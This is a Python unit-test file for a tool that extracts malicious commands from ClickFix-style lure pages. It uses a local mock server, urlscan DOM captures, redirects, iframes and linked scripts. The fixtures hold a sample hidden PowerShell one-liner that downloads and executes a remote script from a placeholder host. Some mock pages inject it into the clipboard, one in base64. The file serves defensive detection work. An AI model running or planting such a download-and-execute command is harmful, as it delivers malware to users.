"""Layered-extraction tests that exercise the network paths.

A throwaway local HTTP server stands in for the lure infrastructure, so these
run offline and deterministically. They cover the layer ordering (urlscan DOM
first, then live fetches, then linked scripts), redirect handling, and the
failure taxonomy.
"""

import base64
import os
import sys
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

from config import ExtractConfig  # noqa: E402
from extractor import (  # noqa: E402
    FAIL_PAGE_UNREACHABLE,
    LAYER_DOM,
    LAYER_LIVE_FINAL,
    LAYER_SCRIPT,
    extract_command,
)
from urlscan_result import ScanDetail  # noqa: E402

PS = 'powershell -w hidden -nop -c "iex(irm http://example.invalid/a.ps1)"'

ROUTES = {}


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        route = ROUTES.get(self.path)
        if route is None:
            self.send_error(404)
            return
        status, ctype, body = route
        if status in (301, 302):
            self.send_response(status)
            self.send_header("Location", body)
            self.end_headers()
            return
        payload = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *a):
        pass


class LayerTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = HTTPServer(("127.0.0.1", 0), _Handler)
        cls.port = cls.server.server_port
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()
        cls.base = f"http://127.0.0.1:{cls.port}"

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self):
        ROUTES.clear()
        self.cfg = ExtractConfig(fetch_timeout=5)

    def url(self, path):
        return self.base + path


class TestLayerOrdering(LayerTestCase):
    def test_dom_layer_wins_when_live_page_is_dead(self):
        # The classic real-world case: lure domain already taken down, but
        # urlscan captured the rendered DOM while it was alive.
        scan = ScanDetail(
            uuid="u1",
            task_url=self.url("/gone"),
            final_url=self.url("/gone"),
            dom=f'<script>navigator.clipboard.writeText("{PS}");</script>',
        )
        r = extract_command(self.url("/gone"), self.cfg, scan=scan)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_DOM)

    def test_live_layer_used_when_no_dom(self):
        ROUTES["/live"] = (200, "text/html", f'<script>navigator.clipboard.writeText("{PS}");</script>')
        scan = ScanDetail(uuid="u2", task_url=self.url("/live"), final_url=self.url("/live"))
        r = extract_command(self.url("/live"), self.cfg, scan=scan)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_LIVE_FINAL)

    def test_works_with_no_scan_detail_at_all(self):
        # Degraded mode: no urlscan API key, so extraction is live-fetch only.
        ROUTES["/nokey"] = (200, "text/html", f'<textarea>{PS}</textarea>')
        r = extract_command(self.url("/nokey"), self.cfg, scan=None)
        self.assertEqual(r.command_text, PS)


class TestLinkedScripts(LayerTestCase):
    def test_command_recovered_from_linked_script(self):
        ROUTES["/page"] = (200, "text/html", '<html><script src="/app.js"></script></html>')
        ROUTES["/app.js"] = (200, "application/javascript", f'navigator.clipboard.writeText("{PS}");')
        r = extract_command(self.url("/page"), self.cfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_SCRIPT)

    def test_script_urls_from_urlscan_are_used(self):
        # The page no longer references the script, but urlscan recorded that
        # it was loaded during the original scan.
        ROUTES["/page2"] = (200, "text/html", "<html>nothing here</html>")
        ROUTES["/hidden.js"] = (200, "application/javascript", f'navigator.clipboard.writeText("{PS}");')
        scan = ScanDetail(
            uuid="u3",
            task_url=self.url("/page2"),
            final_url=self.url("/page2"),
            script_urls=[self.url("/hidden.js")],
        )
        r = extract_command(self.url("/page2"), self.cfg, scan=scan)
        self.assertEqual(r.command_text, PS)

    def test_unfetchable_script_is_recorded(self):
        ROUTES["/page3"] = (200, "text/html", '<html><script src="/missing.js"></script></html>')
        r = extract_command(self.url("/page3"), self.cfg)
        self.assertIsNone(r.command_text)
        self.assertTrue(any("resource_fetch_failure" in n for n in r.notes))


class TestRedirects(LayerTestCase):
    def test_http_redirect_chain_is_recorded(self):
        ROUTES["/start"] = (302, "", self.url("/end"))
        ROUTES["/end"] = (200, "text/html", f'<script>navigator.clipboard.writeText("{PS}");</script>')
        r = extract_command(self.url("/start"), self.cfg)
        self.assertEqual(r.command_text, PS)
        self.assertTrue(r.final_url.endswith("/end"))
        self.assertGreaterEqual(len(r.redirect_chain), 2)

    def test_meta_refresh_is_followed(self):
        ROUTES["/meta"] = (
            200,
            "text/html",
            f'<meta http-equiv="refresh" content="0;url={self.url("/target")}">',
        )
        ROUTES["/target"] = (200, "text/html", f'<textarea>{PS}</textarea>')
        r = extract_command(self.url("/meta"), self.cfg)
        self.assertEqual(r.command_text, PS)
        self.assertTrue(any("meta_refresh_followed" in n for n in r.notes))


class TestIframes(LayerTestCase):
    def test_iframe_src_is_fetched(self):
        ROUTES["/outer"] = (200, "text/html", '<iframe src="/inner"></iframe>')
        ROUTES["/inner"] = (200, "text/html", f'<script>navigator.clipboard.writeText("{PS}");</script>')
        r = extract_command(self.url("/outer"), self.cfg)
        self.assertEqual(r.command_text, PS)

    def test_iframe_not_followed_when_disabled(self):
        ROUTES["/outer2"] = (200, "text/html", '<iframe src="/inner2"></iframe>')
        ROUTES["/inner2"] = (200, "text/html", f'<script>navigator.clipboard.writeText("{PS}");</script>')
        cfg = ExtractConfig(fetch_timeout=5, follow_iframes=False)
        r = extract_command(self.url("/outer2"), cfg)
        self.assertIsNone(r.command_text)


class TestFailureTaxonomy(LayerTestCase):
    def test_page_unreachable(self):
        r = extract_command(self.url("/does-not-exist"), self.cfg)
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, FAIL_PAGE_UNREACHABLE)
        self.assertTrue(any("page_unreachable" in n for n in r.notes))

    def test_connection_refused_is_page_unreachable(self):
        r = extract_command("http://127.0.0.1:1/nope", self.cfg)
        self.assertEqual(r.failure_reason, FAIL_PAGE_UNREACHABLE)

    def test_reachable_but_benign_is_no_command(self):
        ROUTES["/benign"] = (200, "text/html", "<html><h1>Are you human?</h1></html>")
        r = extract_command(self.url("/benign"), self.cfg)
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, "no_command")

    def test_dom_unavailable_note_is_preserved(self):
        ROUTES["/nodom"] = (200, "text/html", "<html>nothing</html>")
        scan = ScanDetail(
            uuid="u4",
            task_url=self.url("/nodom"),
            final_url=self.url("/nodom"),
            notes=["dom_unavailable:no_api_key"],
        )
        r = extract_command(self.url("/nodom"), self.cfg, scan=scan)
        self.assertTrue(any("dom_unavailable" in n for n in r.notes))


class TestProvenance(LayerTestCase):
    def test_original_and_final_urls_are_distinguished(self):
        ROUTES["/final"] = (200, "text/html", f'<textarea>{PS}</textarea>')
        scan = ScanDetail(
            uuid="u5",
            task_url="http://original.invalid/lure",
            final_url=self.url("/final"),
            redirect_chain=["http://original.invalid/lure", self.url("/final")],
        )
        r = extract_command("http://original.invalid/lure", self.cfg, scan=scan)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.original_url, "http://original.invalid/lure")
        self.assertIn("/final", r.final_url)
        self.assertEqual(len(r.redirect_chain), 2)

    def test_layers_tried_is_reported(self):
        ROUTES["/layered"] = (200, "text/html", "<html>nothing</html>")
        r = extract_command(self.url("/layered"), self.cfg)
        self.assertIn(LAYER_LIVE_FINAL, r.layers_tried)

    def test_method_is_reported_for_every_hit(self):
        blob = base64.b64encode(PS.encode()).decode()
        ROUTES["/m"] = (200, "text/html", f'<script>navigator.clipboard.writeText(atob("{blob}"));</script>')
        r = extract_command(self.url("/m"), self.cfg)
        self.assertEqual(r.method, "clipboard_writetext")
        self.assertEqual(r.source_note, f"{LAYER_LIVE_FINAL}:clipboard_writetext")


if __name__ == "__main__":
    unittest.main(verbosity=2)
